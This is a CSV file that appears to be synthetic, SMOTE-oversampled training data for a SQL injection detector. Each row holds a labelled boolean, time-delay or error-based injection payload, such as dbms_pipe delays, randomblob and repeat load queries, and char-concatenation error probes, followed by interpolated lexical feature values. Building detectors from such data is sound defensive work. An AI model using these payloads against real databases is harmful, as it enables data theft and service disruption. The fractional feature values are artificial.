id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001851,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,0.1538055794569309,170.47093731178518,36.02840157829638,3.9450696692992144,51.710039457409536,24.36922051785296,64.05085839696612,30.340818939556577,0.3034143049940186,0.1429207878505241,0.3754872819805752,0.17817762517488211,3.8863936868144737,0.0,0.05680315659276336,0.0,0.0,2.0,0.0,12.284015782963817,0.0,2.0,1.085204734889145,10.113606313185526,0.9715984217036184,0.0,0.028401578296381458,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9715984217036184,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.19881104807467098,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.17040946977829
SMOTE_001852,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000023,0.48131415202135075,54.31565409945995,21.429711749549956,3.6942376610931764,13.201596449369937,17.342172950270026,17.771884699819978,6.0,0.24180654817176522,0.3203908692296966,0.3271880833765566,0.11061449922198156,0.0,0.885942349909991,2.114057650090009,0.0,0.0,2.0,0.0,1.0,0.0,0.0,-2.220446049250313e-16,4.114057650090009,0.0,0.885942349909991,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.885942349909991,0.11405765009000907,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001853,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,1.8336148467597397,162.09619302866216,36.0,4.174529244310013,70.92534852826523,19.572144771496614,46.764530828820924,24.834168900079383,0.43930627634995495,0.12045430390340549,0.2873653652692038,0.1528740544774357,3.262024128582769,0.0,1.4759517428344617,0.0,0.7379758714172309,2.0,0.0,6.834168900079384,0.0,4.213927614251692,3.213927614251693,7.0480965143310765,1.0,0.0,0.7379758714172309,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.26202412858276913,1.7379758714172309,0.0,1.0,0.7379758714172309,0.7379758714172309,0.26202412858276913,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.475951742834462
SMOTE_001854,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000007,0.8510903581024274,54.91515996345426,19.21818498629535,3.557466121370996,8.725254989340826,20.98585999390904,17.97171998781809,7.232324992386303,0.1549151173423317,0.38859489528444446,0.32708183393564944,0.1294081534375743,0.0,0.24646499847726075,3.0,0.0,0.0,2.0,0.0,1.4929299969545227,0.0,0.24646499847726078,0.2464649984772609,5.0,0.0,0.24646499847726078,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001855,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000022,1.8554086046904492,116.38927899057478,30.991166475172403,3.7684920977619814,43.097168773103576,12.646055108735606,44.318610791954,16.3274443167816,0.36252513300514444,0.11136200684300879,0.3844355428857294,0.14167731726611732,1.9911664751724023,0.0,2.0,0.6637221583908007,0.3362778416091994,1.0,0.0,7.9911664751724025,0.0,0.0,1.3362778416091992,4.0,0.6637221583908006,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.3362778416091992,0.0,0.0,0.33627784160919927,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6725556832183983
SMOTE_001856,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000003,4.794973117929333,32.98077601066291,13.912586179879474,2.8713897413837364,5.281465449698679,5.805948370421845,15.89336219054237,6.0,0.17812218231633642,0.16257217736848345,0.472058716400928,0.18724692391425202,0.5437069100602638,0.4562930899397363,0.0,0.9125861798794724,0.45629308993973633,0.5437069100602636,0.0,2.543706910060264,0.5437069100602637,0.0,-2.220446049250313e-16,1.9125861798794723,0.5437069100602637,0.4562930899397363,0.0,0.0,0.4562930899397363,0.5437069100602636,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5437069100602638,0.4562930899397364,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001857,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000013,0.9603003765962964,373.0871041216348,31.0,3.400311198733237,97.02903470721161,56.382945460096046,167.94009916346172,51.73502479086544,0.26004272375745735,0.15138340900795408,0.4499444564208965,0.1386294108136921,0.588019832692348,0.0,2.5589851254807394,0.0,0.0,3.0,0.0,34.588019832692346,0.0,0.0,1.0,15.55898512548074,0.147004958173087,0.0,0.852995041826913,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.8529950418269129,0.0,0.2940099163461741,0.852995041826913,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_001858,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000016,1.3632337446705702,149.81947688762176,34.443586527381804,4.170665581764245,72.42102113833452,16.0,44.90973844381088,16.48871730547636,0.48351939277935463,0.10709967774104348,0.29918810423554343,0.11019282524405843,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.488717305476361,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.4887173054763607,0.5112826945236393,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001859,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000006,1.2211198201685007,232.14907208594974,35.53470192051737,3.7389238634475954,67.40615864232815,28.267350960258685,94.13880768206947,42.336754801293424,0.28937626699071023,0.12252452763985737,0.406070704576737,0.1820285007926954,4.0,0.0,0.0,0.0,0.0,2.0,0.0,20.534701920517367,2.0,1.6336754801293418,3.633675480129342,10.534701920517367,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.3663245198706582,0.6336754801293419,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.267350960258684,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.267350960258684
SMOTE_001860,attack,boolean,-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',nearest_attack_euclidean,R000015,2.4316765030132705,49.38479868488271,18.18306179687228,3.125598659015453,4.061020598957427,12.713572096350996,22.366123593744568,10.244082395829711,0.08352955383282185,0.25900945990288965,0.45671868498094864,0.20074230128333984,2.591530898436141,0.0,1.4694897005212861,0.0,0.5305102994787139,1.5305102994787139,0.0,3.0610205989574286,1.0610205989574275,0.0,-2.220446049250313e-16,3.530510299478714,1.0,0.0,0.46948970052128625,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.5305102994787139,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5305102994787143
SMOTE_001861,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,1.8192426622640474,142.42238617153515,32.70272721973384,4.054305821904813,70.09124992713403,11.702727219733836,44.70272721973384,15.92568180493346,0.4932938936046759,0.08018215690184397,0.31426425170801314,0.11225969778546702,0.0,0.4628409024667295,2.0,0.0,1.0,1.4628409024667295,0.0,6.0,0.0,0.0,2.0,4.462840902466729,0.0,0.4628409024667295,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.4628409024667296,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4628409024667297
SMOTE_001862,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,1.0549994575922632,390.74414424497604,31.0,3.2842844223871857,100.69729820478472,49.814413305263116,185.0,55.23243273492824,0.2576955652228886,0.1274999070289462,0.47345618279676976,0.14134834495139537,2.97657697990432,0.0,0.25585575502392,0.0,0.0,3.0,0.0,38.0,0.0,0.0,1.0,13.25585575502392,0.74414424497608,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,1.74414424497608,0.25585575502392,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_001863,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,0.9140256984433596,388.06165636324556,31.0,3.2992909433694146,102.02055212108186,48.53913238115709,182.2015774888053,55.300394372201325,0.26287195184854295,0.1253190219946076,0.4693399486481125,0.14246907750873689,3.440315497761059,0.0,0.4197633766792057,0.0,0.0,3.0,0.0,37.440315497761055,0.0,0.0,1.0,13.419763376679207,0.8600788744402648,0.0,0.13992112555973513,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.1399211255597353,0.0,1.7201577488805293,0.13992112555973535,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_001864,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000002,0.4971233227433543,125.0424282552202,33.11170039243361,3.7348592601920245,36.34570824110589,16.005303531902527,51.127610988141186,21.563805494070593,0.2906437527034732,0.12806874188958045,0.4093471681527585,0.17194033725418784,5.776599215132772,0.0,0.0,0.8882996075663862,0.0,2.0,0.0,8.893603139468912,2.0,0.11170039243361385,1.223400784867228,3.558501962168069,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.11170039243361399,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5585019621680694,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.558501962168069
SMOTE_001865,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000022,0.7307077618077089,111.08773445844395,32.155390636920565,3.6912013428976747,32.31078127384113,15.0,46.31078127384112,17.466171910761688,0.29086079545084054,0.13509588058456418,0.41695028399643375,0.1570930399681615,3.466171910761687,0.0,1.6892187261588751,1.0,0.0,1.1553906369205622,0.0,8.844609363079439,0.31078127384112475,0.0,1.0,3.844609363079438,1.0,0.0,0.8446093630794376,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.15539063692056237,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1553906369205622
SMOTE_001866,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,1.2555928433174484,230.68728468163968,36.0,3.839066535293233,73.33684856472219,27.602717510439064,89.66010957724906,40.08760902922938,0.3165391932798717,0.12186651982713376,0.38736226596719286,0.1742320209258017,4.0,0.0,0.0,0.0,0.0,2.0,0.0,19.205435020878127,0.0,2.0,3.161630506263437,11.441087004175625,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.2794564979121875,0.0,0.27945649791218746,0.0,0.7205435020878125,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.043804514614687,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.323261012526875
SMOTE_001867,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000016,1.6545449663027167,137.35855818010802,30.92889804156339,4.07328227470922,67.57186405541785,13.143728110835708,41.0,15.642966013854464,0.492327993309416,0.09458851735216411,0.2991210347535523,0.11396245458486765,0.0,0.6429660138544635,2.0,0.0,1.0,1.6429660138544637,0.0,5.357033986145536,0.0,0.0,2.0,4.642966013854464,0.0,0.6429660138544636,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.6429660138544637,1.0,0.3570339861455364,0.6429660138544636,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6429660138544637
SMOTE_001868,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,1.4272947228223054,152.94773121330527,34.40755220945603,4.1819616355028515,75.04259696041835,15.725074584937188,41.0,21.18005966794975,0.4912254108056745,0.10101515367008018,0.2702588672603916,0.1375005682638536,2.3175223754811562,0.0,2.0,0.0,1.0,1.7725074584937188,0.0,5.227492541506281,0.0,3.862537292468594,3.5450149169874376,5.545014916987437,0.7725074584937188,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.7725074584937186,0.0,0.7725074584937188,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.545014916987438
SMOTE_001869,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,1.2076146098930556,155.88103727747642,35.516726094233505,4.138388300818578,75.78810372774764,14.30482982198115,48.15241491099057,17.635688816757067,0.4864677367386212,0.09126182498432256,0.3088398361845777,0.11343060209247852,0.0,1.635688816757069,1.5762074554952874,0.0,1.0,2.0,0.0,6.0,0.4237925445047127,0.0,2.0,4.576207455495288,0.0,1.0,0.7881037277476437,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.7881037277476436,1.0,1.2118962722523565,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001870,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000003,1.648672609354672,36.27422241837104,13.313777742114354,2.691897323406535,3.784444355285885,7.901777902599758,18.5880001604854,6.0,0.11304699634088747,0.21130561260570307,0.5076603876520706,0.16798700340133887,0.8431111289428228,0.1568888710571773,0.0,0.3137777421143547,0.15688887105717741,0.8431111289428227,0.0,2.843111128942823,0.8431111289428226,0.0,-2.220446049250313e-16,1.3137777421143548,0.8431111289428227,0.15688887105717747,0.0,0.0,0.1568888710571772,0.8431111289428227,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8431111289428227,0.15688887105717741,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001871,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000031,0.556711429356902,141.09693653247214,39.224507740222904,4.028166088464441,48.229540246859145,22.321444272695043,51.83676161033436,18.70919040258359,0.341719413360974,0.15823065139362413,0.36743810562561785,0.13261182961978402,2.7091904025835896,0.09693653247213674,2.0,0.9030634675278633,0.09693653247213674,2.0,0.0,8.612253870111452,0.0,0.0,1.0969365324721367,5.903063467527863,0.9030634675278633,0.09693653247213674,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.09693653247213677,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.096936532472137
SMOTE_001872,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000025,0.4470152371128197,235.27067652237236,36.08471176815816,3.758692696894486,72.16942353631632,27.169423536316312,94.50827060894895,41.42355884079078,0.306802533173501,0.1154762098203749,0.40170067842980556,0.17602057857631853,0.3388470726326278,0.0,1.8305764636836863,0.0,0.0,1.0847117681581568,0.0,22.0,0.16942353631631385,2.0,4.0,12.915288231841844,0.0847117681581569,0.0,0.9152882318418432,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0847117681581569,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.084711768158158
SMOTE_001873,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000019,1.5412841751689625,74.41157137787768,26.846942826726615,3.8307237217100876,16.82314275575537,21.741485795395697,24.564628551151074,11.282314275575537,0.22450428905512027,0.29386209167453836,0.33005622956883807,0.15157738970150328,0.0,1.846942826726613,2.4353714488489246,0.0,0.0,1.7176857244244623,0.0,3.282314275575537,0.0,1.0,1.0,4.153057173273387,0.0,1.0,0.7176857244244623,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7176857244244623,0.0,0.2823142755755378,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001874,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000002,0.2382406302797751,120.85424116883175,33.05353112734488,3.732596957351453,35.12415367424259,15.481780146103969,49.49887156565679,20.749435782828396,0.2906200777889072,0.12813976663327853,0.40982066644407905,0.17141948913373525,5.892937745310229,0.0,0.0,0.9464688726551146,0.0,2.0,0.0,8.428249018759082,2.0,0.05353112734488541,1.1070622546897708,3.267655636724427,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.05353112734488541,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.26765563672442694,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.267655636724427
SMOTE_001875,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000002,0.4904780001240412,119.20343551670837,33.64266869237328,3.7566427119784978,35.10171775835419,15.73447850556946,48.459049065980906,19.908190186803818,0.29387065346180247,0.13141070815305816,0.40710091749516664,0.16761772088997268,5.724570560411453,0.0,0.1836196263923644,1.0,0.0,2.0,0.0,8.091809813196182,1.8163803736076356,0.0,1.0,3.2754294395885464,1.0,0.0,0.0918098131961822,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0918098131961822,0.0,0.0918098131961822,0.0,0.9081901868038178,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.091809813196182
SMOTE_001876,attack,boolean,-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',nearest_attack_euclidean,R000015,1.394898969424153,92.43827865139988,24.037282718001578,3.3816702540213286,16.68185660769837,17.869097057231738,39.21458234339043,18.672742643079346,0.1288120914611571,0.22430004671060733,0.4345550420252289,0.21233281980300667,4.0,0.0,0.7663628678460327,0.0,0.7663628678460328,2.0,0.0,6.803645585847608,2.0,0.2336371321539673,0.7009113964619018,4.934548528615869,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.2336371321539673,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1681856607698364,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.168185660769836
SMOTE_001877,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000028,2.9247893461786396,113.68764233836188,29.5098234619766,3.956676187788666,50.000996560806506,11.921412304187214,35.68664577755537,16.078587695812786,0.40918003427080935,0.1281070584124058,0.3184060698069915,0.1443068375097934,0.0,4.0,0.4901765380234018,0.0,0.5098234619765982,1.5098234619765982,0.0,5.0196469239531964,1.0196469239531964,0.4901765380234018,1.5098234619765982,2.5098234619765973,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5098234619765982,0.0,0.0,0.5098234619765982,1.5098234619765982,0.4901765380234019,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0196469239531964
